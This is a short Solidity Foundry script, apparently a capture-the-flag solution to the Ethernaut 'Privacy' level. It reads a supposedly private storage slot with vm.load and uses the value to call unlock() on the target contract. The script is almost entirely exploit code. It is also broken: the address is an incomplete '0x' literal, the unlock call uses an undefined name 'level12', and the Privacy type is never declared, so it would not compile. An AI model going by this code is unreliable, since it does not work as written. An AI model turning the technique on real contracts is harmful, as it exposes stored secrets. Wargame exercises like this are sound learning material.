// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Script } from "forge-std/Script.sol";

contract POC is Script {

    Privacy contractAdress = Privacy(0x);

    function run() external{
        vm.startBroadcast();
        bytes32 myKey = vm.load(address(contractAdress), bytes32(uint256(5)));
        level12.unlock(bytes16(myKey));
        vm.stopBroadcast();
    }
}
